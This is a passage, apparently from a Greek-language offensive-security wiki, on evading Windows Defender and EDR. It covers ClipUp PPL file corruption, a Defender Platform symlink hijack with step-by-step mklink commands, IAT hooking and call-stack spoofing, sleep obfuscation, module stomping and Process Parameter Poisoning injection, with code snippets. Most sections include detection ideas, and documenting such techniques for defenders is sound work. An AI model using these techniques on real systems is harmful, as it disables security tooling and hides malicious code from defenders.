4) Κατά την επανεκκίνηση, η εγγραφή με προστασία PPL γίνεται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα εντολής (οι διαδρομές έχουν αποκρυφτεί/συντομευτεί για λόγους ασφάλειας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp, μόνο τη θέση τους· η primitive είναι κατάλληλη για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα file locks.

Εντοπισμοί
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως γονική διεργασία μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να εκκινούν αυτόματα ύποπτα binaries και να ξεκινούν σταθερά πριν από το Defender/AV. Διερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/τους καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binaries που δεν ανήκουν σε AV.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και με ποιες γονικές διεργασίες· αποκλείστε την κλήση του ClipUp εκτός νόμιμων πλαισίων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα το tamper protection και οι early-launch protections του Defender· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack του φακέλου έκδοσης Platform

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους στο:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τις διαδρομές της υπηρεσίας/του registry). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να επιτύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή πρόκλησης επανεπιλογής πλατφόρμας από το Defender (επανεκκίνηση της υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφικά τιμή χωρίς να επαληθεύει αν ο στόχος επιλύεται σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε μέσα στο Platform ένα symlink καταλόγου με υψηλότερη έκδοση που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή Trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν τη θέση.

Επιλογές μετά την εκμετάλλευση
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση να μην επιλύεται η διαμορφωμένη διαδρομή και το Defender να μην ξεκινά:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι ομάδες red team μπορούν να μεταφέρουν το runtime evasion από το C2 implant στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα API μέσω κώδικα (PIC) που ελέγχεται από τον επιτιθέμενο και δεν εξαρτάται από τη θέση του. Με αυτόν τον τρόπο, το evasion δεν περιορίζεται πλέον στο μικρό σύνολο API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και οι ίδιες προστασίες επεκτείνονται σε BOFs και post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Προετοιμάστε ένα PIC blob δίπλα στο target module, χρησιμοποιώντας reflective loader (με προσθήκη στην αρχή ή ως συνοδευτικό). Το PIC πρέπει να είναι αυτοτελές και ανεξάρτητο από τη θέση του.
- Καθώς φορτώνεται το host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις εγγραφές IAT για τα imports-στόχους (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν καλέσει την πραγματική διεύθυνση του API με tail-call. Συνήθη evasions περιλαμβάνουν:
  - Mask/unmask μνήμης γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και επαναφορά μετά την κλήση.
  - Call-stack spoofing: κατασκευή ενός αβλαβούς stack και μετάβαση στο target API, ώστε η ανάλυση του call stack να καταλήγει στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει τα API που θα γίνουν hook για Beacon, BOFs και post-ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του κώδικα του εργαλείου ή εξάρτηση από το Beacon για τη διαμεσολάβηση συγκεκριμένων API.
- Καλύπτει post-ex DLLs: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση modules (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Αποκαθιστά την αξιόπιστη χρήση post-ex εντολών που δημιουργούν διεργασίες απέναντι σε detections βασισμένα στο call stack, μέσω wrapper για τα CreateProcessA/W.

Ελάχιστο παράδειγμα IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patch ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για το PIC και αποφύγετε σελίδες με δικαιώματα εγγραφής και εκτέλεσης ταυτόχρονα.

Stub πλαστογράφησης call stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια πλαστή αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και έπειτα μεταπηδούν στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν κανονικά stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε τα με τεχνικές stack cutting/stack stitching, ώστε να καταλήγετε μέσα στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Προσθέστε τον reflective loader στην αρχή των post-ex DLLs, ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να δηλώσετε τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Ζητήματα Detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις non-image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής ancestry του RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές εντός διεργασίας στην IAT, δραστηριότητα DllMain νωρίς κατά τη φόρτωση που τροποποιεί import thunks, απροσδόκητες περιοχές RX που δημιουργούνται κατά τη φόρτωση.
- Παράκαμψη image-load: αν κάνετε hooking στα LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα απόκρυψης μνήμης.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC stubs πλαστογράφησης call stack (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks IAT κατά το import μέσω resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον pointer `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC απελευθερώσει τη μνήμη του.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε αναζήτηση hooks βάσει hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε το πραγματικό `GetProcAddress`.
- Καταχωρίστε τους στόχους των hooks κατά το link time με entries του Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **IAT redirection κατά το import**, χωρίς patching στο code section του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά το import ενεργοποιούνται μόνο αν η συνάρτηση βρίσκεται πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), εξαναγκάστε ένα κανονικό import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικαταστήστε την επίλυση hashed exports (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με μια άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την παρεμβολή κατά την επίλυση των imports από τον reflective loader.

### Απόκρυψη ύπνου/αδράνειας τύπου Ekko χωρίς patching στο `Sleep()`

Αντί να κάνετε patch στο `Sleep`, κάντε hooking στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλης διάρκειας αναμονές, περιβάλετε την κλήση με μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα frames `CONTEXT`.
- Τυπική αλυσίδα (x64): ορισμός του image σε `PAGE_READWRITE` → κρυπτογράφηση RC4 μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεση της blocking αναμονής → αποκρυπτογράφηση RC4 → **επαναφορά των δικαιωμάτων ανά section** με περιήγηση στα PE sections → σηματοδότηση ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· αντιγράψτε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελέσετε κάθε βήμα.

Επιχειρησιακή λεπτομέρεια: επιστρέψτε «success» για τις αναμονές μεγάλης διάρκειας (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image παραμένει masked. Αυτό το μοτίβο αποκρύπτει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει το κλασικό signature του «patched `Sleep()`».

Ιδέες για detection (βάσει telemetry)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε στόχους με ενεργό CFG, το πρώτο έμμεσο jump σε gadget στη μέση μιας συνάρτησης, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα metadata CFG του module. Για να διατηρήσετε ενεργές τις αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε έμμεσο προορισμό που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **πλήρες μέγεθος του image**.
- Για χειροκίνητα mapped/PIC/stomped regions, χρησιμοποιήστε αντί γι’ αυτό το **allocation base** και το μέγεθος της allocation.
- Σημειώστε όχι μόνο το dispatch gadget, αλλά και exports στα οποία γίνεται έμμεση μετάβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε executable section ελεγχόμενο από τον attacker που θα γίνει έμμεσος προορισμός.

Έτσι οι αλυσίδες ύπνου τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε ύπνωση

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να προκαλέσει προβλήματα σε συστήματα CET Shadow Stack, επειδή ένα πλαστό `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιουργήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε ύπνωση με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα τα spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντιγράψτε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Μετά την ολοκλήρωση της αναμονής, επαναφέρετε το αρχικό TIB και το thread context.

Έτσι διατηρείται ένα instruction pointer συμβατό με το CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για να επικυρώσουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue είναι υπερβολικά αναγνωρίσιμο, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread μέσω queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Τοποθετήστε σε ουρά τα προετοιμασμένα frames `CONTEXT`/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack thread των 64 KB.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσετε ατομικά το start event και να μπλοκάρετε.
- Αναστείλετε το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), για να μειώσετε το χρονικό παράθυρο race κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από ύπνους, αναμονές ή dispatch APC.
- `GetThreadContext`/`SetThreadContext` γύρω από τα `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` που ακολουθείται από άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που φτάνουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει map μέσα στη διεργασία-στόχο**, αντί να δεσμεύει εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο, disk-backed image**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει διαδρομές κώδικα που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην έχει φορτωθεί στην απομακρυσμένη διεργασία, ενώ μια υπερβολικά μικρή περιοχή κώδικα θα προκαλέσει crash της διεργασίας. Μια πιο αξιόπιστη διαδικασία είναι:

1. Απαριθμήστε τα modules της διεργασίας-στόχου και κρατήστε μια **λίστα include μόνο με ονόματα** DLLs που είναι ήδη φορτωμένα.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθος σε bytes**.
3. Σαρώστε τα υποψήφια DLLs στον δίσκο και συγκρίνετε το PE section **`.text` `Misc_VirtualSize`** με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται map στη μνήμη**.
4. Κάντε parse τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχικό offset για το stomp.
5. Υπολογίστε το **blast radius**: αν το payload ξεπερνά τα όρια της επιλεγμένης συνάρτησης, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Συνήθη βοηθητικά εργαλεία recon/επιλογής που έχουν παρατηρηθεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγεις τα telemetry events από `LoadLibrary`/μη αναμενόμενες φορτώσεις image.
- Προτίμησε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο, διαφορετικά κανονικές διαδρομές κώδικα μπορεί να εκτελέσουν τα bytes που έχουν γίνει stomp πριν ή μετά τη δημιουργία του thread.
- Για μεγάλα implants, συχνά απαιτείται αλλαγή της ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον πηγαίο κώδικα του injector.

Detection ideas
- Εγγραφές από απομακρυσμένη διεργασία σε εκτελέσιμες σελίδες που υποστηρίζονται από image (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές δεσμεύσεις RWX/RX.
- Σημεία εισόδου export των οποίων τα bytes στη μνήμη δεν αντιστοιχούν πλέον στο αντίστοιχο αρχείο στο δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεσή τους μέσα σε export νόμιμου DLL του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` προς σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη διεργασία-παιδί** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers που αντιγράφονται από την `CreateProcessW`

Χρήσιμα carriers είναι τα εξής:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για την `CreateProcessW` και περιορίζεται στους **32,767 χαρακτήρες Unicode**, μαζί με τον null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερό, τεκμηριωμένο συμβόλαιο.

Έτσι, η κανονική δημιουργία διεργασίας γίνεται το **primitive μεταφοράς payload**. Ο operator δημιουργεί τη διεργασία-παιδί με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς APIs απομακρυσμένης εγγραφής

Μετά τη δημιουργία της διεργασίας-παιδιού, εντοπίζεις το αντιγραμμένο buffer με **primitives μόνο για ανάγνωση**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λαμβάνεις το `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Διαβάζεις το απομακρυσμένο `PEB`
3. Ακολουθείς το `PEB.ProcessParameters`
4. Διαβάζεις το `RTL_USER_PROCESS_PARAMETERS`
5. Χρησιμοποιείς τον επιλεγμένο pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργία της διεργασίας κανονικά (χωρίς αναστολή)
2. Ορισμός της επιλεγμένης σελίδας παραμέτρων ως εκτελέσιμης με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατεύθυνση της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας υποκλοπής thread, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που έχει επιστραφεί.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός των null byte και staged shellcode

Και οι τρεις φορείς είναι **δεδομένα τύπου string ή παρόμοια**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free πρώτο στάδιο** που ανασυνθέτει σταθερές κατά τον χρόνο εκτέλεσης και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω της στοίβας από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στη στοίβα του στόχου
- δεσμεύσει τον **χώρο shadow 32 byte του x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρεί το `RSP` **ευθυγραμμισμένο στα 16 byte** πριν από την κλήση

